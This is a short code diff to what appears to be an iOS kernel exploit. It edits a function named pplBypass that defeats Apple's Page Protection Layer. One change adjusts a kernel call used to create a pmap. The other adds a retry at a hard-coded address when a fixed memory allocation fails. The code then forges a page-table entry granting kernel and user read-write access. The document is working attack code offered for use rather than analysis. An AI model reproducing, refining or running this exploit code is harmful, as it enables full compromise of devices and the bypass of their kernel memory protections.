@@ -70,7 +70,7 @@ uint64_t pmapFirstFree(uint64_t pmap, uint64_t start) {
     }
 }
 
-#define CREATE_PMAP() kcall(pmap_create_options, 0 /* ledger */, 0 /* size */, 0x1 /* flags */, 0, 0, 0, 0, 0)
+#define CREATE_PMAP() kcall(pmap_create_options, 0 /* ledger */, 0 /* size */, 0x1 /* flags */, 0, 0, 0, 0, 0, 0, 0)
 
 bool pplBypass(void) {
     uint64_t pagePhys  = getPageForPPL();
@@ -171,8 +171,14 @@ bool pplBypass(void) {
     
     kr = vm_allocate(mach_task_self(), &vm_addr, 0x4000, VM_FLAGS_FIXED);
     guard (kr == KERN_SUCCESS) else {
-        puts("[-] pplBypass: Failed to allocate fixed!");
-        return false;
+        page_R_va = 0x2CC000000;
+        vm_addr   = page_R_va;
+        
+        kr = vm_allocate(mach_task_self(), &vm_addr, 0x4000, VM_FLAGS_FIXED);
+        guard (kr == KERN_SUCCESS) else {
+            puts("[-] pplBypass: Failed to allocate fixed!");
+            return false;
+        }
     }
     
     uint64_t pteEntry = pagePhys | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
